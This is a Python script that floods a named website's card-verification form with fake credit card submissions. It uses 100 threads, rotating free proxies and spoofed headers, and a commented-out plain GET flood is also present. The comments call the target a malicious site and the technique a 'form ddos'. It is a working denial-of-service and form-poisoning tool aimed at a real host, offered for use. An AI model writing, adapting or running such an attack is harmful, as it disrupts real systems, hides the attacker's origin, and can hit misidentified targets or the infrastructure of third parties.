import random
import requests
from fake_useragent import UserAgent
from faker import Faker
import threading
import sys
import os

from fp.fp import FreeProxy

fake = Faker()

# a malicious website
target = '107.150.4.187'
attack_num = 0
fail_num = 0

proxies = [] # Will contain proxies [ip, port]

# Retrieve a random index proxy (we need the index to delete it if not working)
def random_proxy():
    return random.randint(0, len(proxies) - 1)

def get_proxy():
    proxy= FreeProxy().get().split(':')
    return {'http':proxy[0] + ':' + proxy[1]}

def fackpack():
    return {'uid':random.randrange(10**3,10**4),
            'card':fake.credit_card_number(),
            'name':fake.first_name()+' '+fake.last_name(),
            'date':fake.credit_card_expire(),
            'cvv':fake.credit_card_security_code(),
            'state': fake.country_code(),
            'zip': fake.postcode(),
            'city': fake.city(),
            'address1':fake.street_address(),
            'address2':" "
            }

def attack():

    while True:
        # user_agent = random.choice(user_agent_list)
        headers = {'User-Agent': fake.ios_platform_token(), 
                   'Accept-Language': 'en-US, en;q=0.5',
                   'Accept': '*/*'}
        # proxy = random.choice(proxies)
        # proxy_index = 0

        # better free proxies
        proxy=get_proxy()
        # Make the call
        global fail_num, attack_num  
        attack_num+=1
        try:
            # form ddos
            req = requests.post(f"https://ususbvi.top/php/app/index/verify-card.php?t={random.randrange(10**13,10**14)}",
                        data=fackpack(),
                        headers=headers,
                        proxies=proxy,
                        timeout=3
                        )
            
            # normal ddos
            # req = requests.get(f'https://ususbvi.top',
            #             headers=headers,
            #             proxies={proxy},
            #             timeout=3
            #             )
            if ((attack_num-fail_num)%10==0):
                sys.stderr.write(f'\r #{attack_num-fail_num}/{attack_num} success. :' + req.text)
                sys.stdout.flush()
        except Exception as e: # If error, delete this proxy and find another one
            # del proxies[proxy_index]
            # print('Proxy ' + proxy['ip'] + ':' + proxy['port'] + ' detected.')
            fail_num+=1
            message=f'#{attack_num-fail_num}/{attack_num} failed. {e} Proxy {proxy}.'
            # for keys,values in headers.items():
            #     message+=f'\n {keys}:{values}'
            sys.stderr.write('\r'+message)
            sys.stdout.flush()
            proxy=get_proxy()

for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()